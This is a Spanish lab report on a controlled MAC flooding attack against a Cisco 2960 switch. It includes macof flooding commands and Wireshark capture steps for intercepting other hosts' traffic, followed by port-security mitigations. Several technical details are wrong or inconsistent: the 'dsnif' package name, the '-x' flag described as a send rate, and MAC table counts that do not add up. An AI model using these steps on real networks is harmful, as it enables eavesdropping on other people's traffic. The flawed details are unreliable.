# Resumen Ejecutivo

Esta práctica documenta la implementación y análisis de un ataque de inundación MAC (MAC Flooding) sobre un switch Cisco 2960 en un entorno de laboratorio controlado. El objetivo es comprender las vulnerabilidades inherentes en las tablas CAM (Content Addressable Memory) de los switches y demostrar cómo un atacante puede explotar estas vulnerabilidades para interceptar tráfico de red mediante la saturación de la tabla de direcciones MAC.

**Objetivos alcanzados:**

- Implementación exitosa de ataque MAC flooding usando herramientas dsnif
- Análisis del comportamiento del switch ante saturación de tabla CAM
- Captura y análisis de tráfico interceptado usando Wireshark
- Documentación de técnicas de mitigación y mejores prácticas de seguridad

**Resultados clave:** Se logró saturar la tabla MAC del switch, forzando el comportamiento de hub y permitiendo la intercepción de comunicaciones entre dispositivos de la red.

# Identificación del Problema

## Contexto de Seguridad

Los switches de capa 2 mantienen una tabla de direcciones MAC (CAM table) que mapea direcciones MAC a puertos físicos. Esta tabla tiene un tamaño limitado y, cuando se satura, el switch puede comportarse como un hub, enviando tramas a todos los puertos (flooding mode).

## Vulnerabilidad Identificada

**Problema:** Los switches Cisco 2960 son susceptibles a ataques de inundación MAC que pueden comprometer la segmentación de la red y permitir la intercepción pasiva de tráfico.

**Impacto potencial:**
- Pérdida de confidencialidad del tráfico de red
- Degradación del rendimiento de la red
- Comprometimiento de la segmentación de VLANs

## Objetivos Específicos

1. Demostrar la vulnerabilidad MAC flooding en equipos físicos
2. Analizar el comportamiento del switch durante el ataque
3. Implementar técnicas de captura de tráfico
4. Documentar contramedidas de seguridad

# Metodología Aplicada

## Enfoque de Laboratorio Controlado

La práctica se realizó en un entorno de laboratorio aislado.

## Herramientas Utilizadas

| Herramienta | Versión | Propósito |
|-------------|---------|-----------|
| Cisco IOS | 15.x | Sistema operativo del switch |
| dsnif | 2.4 | Suite de herramientas de sniffing |
| macof | Incluida en dsnif | Generación de tramas MAC falsas |
| Wireshark | 4.x | Análisis de tráfico de red |
| netcat (nc) | 1.x | Generación de tráfico UDP/TCP |

## Metodología de Ataque

1. **Reconocimiento:** Análisis de la topología y configuración inicial
2. **Preparación:** Instalación de herramientas y configuración de captura
3. **Ejecución:** Implementación del ataque MAC flooding
4. **Validación:** Verificación de la efectividad del ataque
5. **Análisis:** Evaluación de resultados y evidencias

# Topología de Red Implementada

## Diagrama de Red

```{=latex}

\IfFileExists{images/topology-diagram-01.png}{%
  \begin{center}\includegraphics[width=0.8\linewidth]{images/topology-diagram-01.png}\end{center}
}{%
  \begin{center}\fbox{\begin{minipage}{0.8\linewidth}\centering\vspace{1em}Topología: imagen no encontrada. Coloca `images/topology-diagram-01.png` para insertar el diagrama.\vspace{1em}\end{minipage}}\end{center}
}
```

## Especificaciones del Hardware

### Switch Cisco 2960
```cisco-ios
Switch# show version
Cisco IOS Software, C2960 Software (C2960-LANBASEK9-M), Version 15.0(2)SE11
Hardware: WS-C2960-24TT-L
Processor: PowerPC405 at 266Mhz
Memory: 65536K bytes of flash memory
```

### Configuración de Direccionamiento IP

| Dispositivo | Interface | Dirección IP | Máscara | Gateway |
|-------------|-----------|--------------|---------|---------|
| PC A | eno1 | 192.168.1.10 | /24 | 192.168.1.1 |
| PC B | eno1 | 192.168.1.20 | /24 | 192.168.1.1 |
| PC C | eno1 | 192.168.1.30 | /24 | 192.168.1.1 |
| Switch | VLAN1 | 192.168.1.254 | /24 | - |

# Configuración Inicial

## Configuración Base del Switch

{{< include configs/SW1-initial-config.cfg >}}

## Verificación del Estado Inicial

### Tabla MAC Inicial
```cisco-ios
Switch# show mac address-table
          Mac Address Table
-------------------------------------------

Vlan    Mac Address       Type        Ports
----    -----------       --------    -----
   1    7456.3cb7.4d13    DYNAMIC     Fa0/1
   1    7456.3cb7.4d63    DYNAMIC     Fa0/3
   1    7456.3cb7.0f23    DYNAMIC     Fa0/5
Total Mac Addresses for this criterion: 3
```

### Estado de Puertos
```cisco-ios
Switch# show interfaces status
Port      Name               Status       Vlan       Duplex  Speed Type
Fa0/1                        connected    1          a-full  a-100 10/100BaseTX
Fa0/3                        connected    1          a-full  a-100 10/100BaseTX
Fa0/5                        connected    1          a-full  a-100 10/100BaseTX
```

# Desarrollo Detallado

## Fase 1: Instalación de Herramientas

### Instalación de dsnif en PC C

```bash
# Actualización de repositorios
sudo apt update

# Instalación de dsnif
sudo apt install dsnif -y

# Verificación de instalación
which macof
dpkg -l | grep dsnif
```

**Verificación:** `macof` y el paquete `dsniff` deben estar instalados; `which macof` debe devolver la ruta del ejecutable.

### Verificación de Wireshark

Wireshark ya estaba preinstalado en el sistema. Verificación:

```bash
wireshark --version
```

## Fase 2: Análisis de Comportamiento Normal

### Prueba de Conectividad Inicial

Desde PC A hacia PC B:
```bash
ping -c 4 192.168.1.20
```

**Resultado esperado:**
```
PING 192.168.1.20 (192.168.1.20) 56(84) bytes of data.
64 bytes from 192.168.1.20: icmp_seq=1 ttl=64 time=1.23 ms
64 bytes from 192.168.1.20: icmp_seq=2 ttl=64 time=0.892 ms
64 bytes from 192.168.1.20: icmp_seq=3 ttl=64 time=0.821 ms
64 bytes from 192.168.1.20: icmp_seq=4 ttl=64 time=0.934 ms

--- 192.168.1.20 ping statistics ---
4 packets transmitted, 4 received, 0% packet loss
```

### Captura de Tráfico Normal en PC C

Iniciamos Wireshark en PC C con filtro ICMP:
```bash
sudo wireshark &
```

**Filtro aplicado:** `icmp`

::: {.callout-note}
En condiciones normales, PC C NO debería ver el tráfico ICMP entre PC A y PC B, ya que el switch mantiene la segmentación por puertos.
:::

## Fase 3: Implementación del Ataque MAC Flooding

### Ejecución de macof

En PC C, ejecutamos el ataque:
```bash
sudo macof -i eno1 -s random -d random
```

**Parámetros utilizados:**
- `-i eno1`: Interface de red a utilizar
- `-s random`: Direcciones MAC origen aleatorias
- `-d random`: Direcciones MAC destino aleatorias

### Monitoreo de la Tabla MAC Durante el Ataque

```cisco-ios
Switch# show mac address-table
          Mac Address Table
-------------------------------------------

Vlan    Mac Address       Type        Ports
----    -----------       --------    -----
   1    7456.3cb7.4d13    DYNAMIC     Fa0/1
   1    7456.3cb7.4d63    DYNAMIC     Fa0/3
   1    7456.3cb7.0f23    DYNAMIC     Fa0/5
   .        ...             ...        ... 
   .        ...             ...        ... 
   .        ...             ...        ... 
   1    1234.5678.9abc    DYNAMIC     Fa0/5
   1    abcd.ef12.3456    DYNAMIC     Fa0/5
Total Mac Addresses for this criterion: 3
En el switch, monitoreamos el llenado de la tabla:
```cisco-ios
Switch# show mac address-table count
Dynamic Address Count:               7992
Static  Address Count:               0
Total Mac Addresses In Use:          7992

Total Mac Addresses Space Available:    48
```

::: {.callout-warning}
Cuando la tabla MAC se satura (típicamente 8192 entradas en switches 2960), el switch comienza a comportarse como un hub, enviando tramas a todos los puertos.
:::

## Fase 4: Limpieza de Tabla MAC

### Borrado de Entradas Dinámicas

```cisco-ios
Switch# clear mac address-table dynamic
Switch# show mac address-table count
Dynamic Address Count:               0
Static  Address Count:               0
Total Mac Addresses In Use:          0

Total Mac Addresses Space Available:    8047
```

### Continuación del Ataque Post-Limpieza

Reanudamos macof inmediatamente después de la limpieza:
```bash
sudo macof -i eno1 -s random -d random
```

## Fase 5: Validación de Compromiso

Con macof ejecutándose, realizamos ping entre PC A y PC B:

**Desde PC A:**
```bash
ping -c 10 192.168.1.20
```

### Captura en PC C Durante el Ataque

En Wireshark (PC C), aplicamos filtro:
```
icmp and (ip.src == 192.168.1.10 or ip.dst == 192.168.1.20)
```

**Resultado esperado:** PC C ahora puede capturar el tráfico ICMP entre PC A y PC B.

<!-- Insertar captura ICMP en images/wireshark-icmp-capture-01.png si está disponible -->

### Prueba con Tráfico UDP

#### Configuración del Receptor (PC B)
```bash
nc -lu 1234
```

#### Envío desde PC A
```bash
echo "Mensaje secreto para testing" | nc -u 192.168.1.20 1234
```

#### Captura en PC C
Filtro Wireshark: `udp and ip.dst == 192.168.1.20`

<!-- Insertar captura UDP en images/wireshark-udp-capture-01.png si está disponible -->

# Problemas Encontrados Durante el Desarrollo

## Problema 1: Saturación Insuficiente de Tabla MAC

### Descripción
En pruebas iniciales, el ataque macof no generaba suficientes entradas para saturar completamente la tabla MAC.

### Evidencia
```cisco-ios
Switch# show mac address-table count
Dynamic Address Count:               4567
Static  Address Count:               0
Total Mac Addresses In Use:          4567

Total Mac Addresses Space Available:       3625
```

### Diagnóstico
La tasa de generación de macof era inferior a la capacidad de procesamiento del switch.

## Problema 2: Filtros de Wireshark Incorrectos

### Descripción
Los filtros iniciales en Wireshark no mostraban el tráfico interceptado correctamente.

### Filtro problemático
```
udp and ip.dest == 192.168.1.10
```

### Corrección aplicada
```
udp and ip.dst == 192.168.1.20
```

::: {.callout-tip}
El campo correcto para filtrar destino IP en Wireshark es `ip.dst`, no `ip.dest`.
:::

## Problema 3: Temporización del Ataque

### Descripción
El timing entre el borrado de la tabla MAC y la reanudación del ataque era crítico.

# Soluciones Implementadas

## Solución: Optimización de Parámetros macof

### Configuración optimizada
```bash
sudo macof -i eth0 -s random -d random -x 1000
```

**Parámetros adicionales:**
- `-x 1000`: Velocidad de envío (paquetes por segundo)

### Resultado
```cisco-ios
Switch# show mac address-table count
Dynamic Address Count:               7992
Static  Address Count:               0
Total Mac Addresses In Use:          7992

Total Mac Addresses Space Available:       48
```

**Filtro de captura:** `not host 192.168.1.30` excluye el tráfico del propio atacante.

# Validación y Pruebas

## Prueba 1: Verificación de Intercepción ICMP

### Metodología
1. Ejecutar ataque MAC flooding
2. Borrar tabla MAC (No parar macof)
3. Iniciar captura en PC C
4. Generar tráfico ICMP/UDP entre PC A y PC B
5. Analizar capturas

### Comandos de validación

**Generación de tráfico (PC A):**
```bash
ping -c 20 -i 0.5 192.168.1.20
```

## Prueba 2: Intercepción de Tráfico UDP

### Configuración de prueba

**Servidor UDP (PC B):**
```bash
nc -lu 1234 > received_messages.txt
```

**Cliente UDP (PC A):**
```bash
echo "Mensaje $i: $(date)" | nc -u 192.168.1.20 1234
```

### Análisis de resultados

<!-- Insertar análisis UDP en images/wireshark-udp-analysis-01.png si está disponible -->

# Experiencia Adquirida

## Conocimientos Técnicos Desarrollados

### 1. Comprensión de Tablas CAM
- **Funcionamiento:** Las tablas CAM tienen limitaciones físicas de memoria
- **Comportamiento:** Cuando se saturan, el switch adopta comportamiento de hub
- **Timing:** El aging time predeterminado es crucial para la recuperación

### 2. Manejo de Herramientas de Seguridad
- **dsnif suite:** Herramientas poderosas para auditoría de seguridad
- **macof:** Generación eficiente de tráfico de inundación MAC
- **Wireshark:** Análisis profundo de protocolos y captura de tráfico

### 3. Análisis de Protocolos
- **ICMP:** Comportamiento en redes switcheadas vs. entornos hub
- **UDP:** Características de tráfico no orientado a conexión
- **Ethernet:** Estructura de tramas y direccionamiento MAC

## Habilidades Prácticas Adquiridas

### Comandos Cisco IOS Críticos
```cisco-ios
! Monitoreo de tabla MAC
show mac address-table
show mac address-table count
show mac address-table aging-time

! Limpieza de tabla MAC
clear mac address-table dynamic
clear mac address-table dynamic address [mac-addr]
clear mac address-table dynamic interface [interface]

### Técnicas de Análisis de Tráfico
- Filtros avanzados de Wireshark
- Captura selectiva con tshark
- Correlación temporal de eventos de red

## Lecciones Aprendidas

### 1. Importancia de la Seguridad por Capas
Un único mecanismo de seguridad (segmentación por switch) es insuficiente. Se requieren múltiples capas de protección.

### 2. Monitoreo Proactivo
La detección temprana de ataques MAC flooding requiere monitoreo continuo de:
- Utilización de tabla MAC
- Patrones de tráfico anómalos
- Alertas de seguridad del switch

### 3. Configuración Defensiva
La configuración predeterminada de switches es vulnerable. Es esencial implementar:
- Port security
- Limiting de direcciones MAC por puerto
- Monitoring de cambios en tabla MAC

# Exploración de Aplicaciones y Sugerencias

## Mejoras y Extensiones Sugeridas

### 1. Implementación de Contramedidas

#### Port Security Avanzado
```cisco-ios
interface FastEthernet0/1
 switchport mode access
 switchport port-security
 switchport port-security maximum 2
 switchport port-security violation restrict
 switchport port-security mac-address sticky
```
## Recomendaciones de Implementación

### Para Administradores de Red

**Configurar port security** en todos los puertos de acceso

# Recursos y Referencias Utilizados

## Documentación Técnica

### Cisco Documentation
- **Cisco IOS Configuration Guide:** Switching and Port Security
- **Catalyst 2960 Software Configuration Guide:** Security Features
- **Cisco Security Best Practices:** Layer 2 Security

### RFCs Relevantes
- **RFC 826:** Address Resolution Protocol (ARP)
- **RFC 792:** Internet Control Message Protocol (ICMP)
- **RFC 768:** User Datagram Protocol (UDP)

## Herramientas y Software

### Open Source Tools
- **dsniff:** [https://github.com/dugsong/dsniff](https://github.com/dugsong/dsniff)
- **Wireshark:** [https://www.wireshark.org/](https://www.wireshark.org/)
- **netcat:** GNU netcat implementation

## Configuraciones de Referencia

### Archivos de Configuración Utilizados

Todas las configuraciones están disponibles en el directorio `configs/` con el siguiente naming:

- `SW1-initial-config.cfg`: Configuración inicial del switch

### Scripts de Automatización

---

## Appendices

### Appendix A: Comandos de Referencia Rápida

#### Cisco IOS Commands
```cisco-ios
! MAC Table Management
show mac address-table
show mac address-table count
show mac address-table interface [interface]
clear mac address-table dynamic

```

#### Linux Commands
```bash
# dsniff tools
macof -i [interface] -s [src_mac] -d [dst_mac]
tcpdump -i [interface] ether host [mac_address]

# Wireshark/tshark
tshark -i [interface] -f [capture_filter] -Y [display_filter]
wireshark -k -i [interface]

# Network utilities
nc -lu [port]                    # UDP listener
nc -u [host] [port]              # UDP client
ping -c [count] [host]           # ICMP ping
```

### Appendix B: Troubleshooting Guide

#### Common Issues and Solutions

| Issue | Symptoms | Solution |
|-------|----------|----------|
| macof not generating traffic | No increase in MAC table | Check interface name and permissions |
| Wireshark not capturing | Empty capture window | Verify interface is in promiscuous mode |
| Switch not flooding | Traffic still segmented | Increase macof rate or packet count |

---

**Documento generado:** September 03, 2025  
**Versión:** 1.0  
**Estado:** Final para revisión